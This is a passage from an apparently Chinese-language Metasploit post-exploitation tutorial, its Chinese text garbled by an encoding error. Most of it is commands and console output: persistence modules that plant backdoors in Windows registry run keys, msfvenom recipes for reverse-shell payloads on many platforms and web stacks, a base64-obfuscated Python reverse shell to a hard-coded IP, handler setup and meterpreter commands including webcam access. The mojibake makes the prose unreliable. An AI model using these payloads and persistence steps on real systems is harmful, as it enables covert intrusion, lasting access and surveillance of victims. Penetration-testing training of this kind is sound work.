çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul>å°è¯•ä¸€ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistenceå®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistenceå’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚<h2 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>## 1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–å®‰è£…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure>å¯åŠ¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤-2"><a href="#2-msfåŸºæœ¬å‘½ä»¤-2" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload-2"><a href="#3-msfvenomç”Ÿæˆpayload-2" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure>1.å¯æ‰§è¡Œç¨‹åºLinux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.è„šæœ¬shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤-2"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤-2" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚<h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-2"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-2" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # 